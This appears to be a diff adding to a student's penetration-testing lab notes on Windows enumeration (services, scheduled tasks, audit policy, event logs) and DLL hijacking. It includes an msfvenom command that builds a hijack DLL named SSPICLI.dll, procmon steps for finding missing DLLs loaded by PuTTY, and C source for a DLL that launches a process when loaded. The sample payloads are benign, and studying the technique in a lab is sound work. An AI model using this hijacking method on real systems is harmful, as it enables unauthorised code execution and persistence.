@@ -49,3 +49,95 @@ proxychains nmap -T5 -Pn -sV -n <target host>
 
 
 
+
+regedit
+##########
+  list sus keys
+
+Services
+##############
+  type "services" in the bottom left
+  sort by descrtption
+  look for any "weird" naming conventions
+  right click any "weird" naming conventions
+  msfvenom -p windows/exec CMD='cmd.exe /C "whoami" > C:\Users\student\Desktop\whoami.txt\' -f dll > SSPICLI.dll
+  right click any "weird" services and go to properties
+    investigate
+Schtasks
+#############
+  type "task scheduler"
+    click folder on the left
+    read into triggers and actions
+Audit logging
+###############
+    auditpol /get /category:* | findstr /i "system"
+
+Event Logging
+################
+  "Event viewer"
+  left side, select Windows Logs -> Security
+  Search for eventIDs
+
+DLL Hijacking 
+##############
+    command prompt: procmon /accepteula
+      process name contains "putty"
+      path contains ".dll"
+      results is "NAME NOT FOUND"
+#include <windows.h>
+
+// A functional function that safely starts a process using modern APIs
+void LaunchTargetProcess()
+{
+    // Define the application to run (using a standard, safe utility for testing)
+    wchar_t commandLine[] = L"notepad.exe";
+
+    STARTUPINFOW si;
+    PROCESS_INFORMATION pi;
+
+    // Initialize the structures safely
+    ZeroMemory(&si, sizeof(si));
+    si.cb = sizeof(si);
+    ZeroMemory(&pi, sizeof(pi));
+
+    // Start the child process safely within the current user's context
+    if (CreateProcessW(
+            NULL,           // Application name
+            commandLine,    // Command line arguments
+            NULL,           // Process handle not inheritable
+            NULL,           // Thread handle not inheritable
+            FALSE,          // Set handle inheritance to FALSE
+            0,              // No creation flags
+            NULL,           // Use parent's environment block
+            NULL,           // Use parent's starting directory 
+            &si,            // Pointer to STARTUPINFO structure
+            &pi             // Pointer to PROCESS_INFORMATION structure
+        ))
+    {
+        // Close handles to avoid resource leaks
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+    }
+}
+
+// Standard entry-point for a Windows DLL
+BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
+{
+    switch (fdwReason)
+    {
+        case DLL_PROCESS_ATTACH:
+            // Disable thread library calls if not needed (optimizes performance)
+            DisableThreadLibraryCalls(hinstDLL);
+            
+            // Execute the function safely
+            LaunchTargetProcess();
+            break;
+
+        case DLL_PROCESS_DETACH:
+            // Cleanup code if necessary
+            break;
+    }
+    
+    // Return TRUE to indicate successful initialization
+    return TRUE;
+}
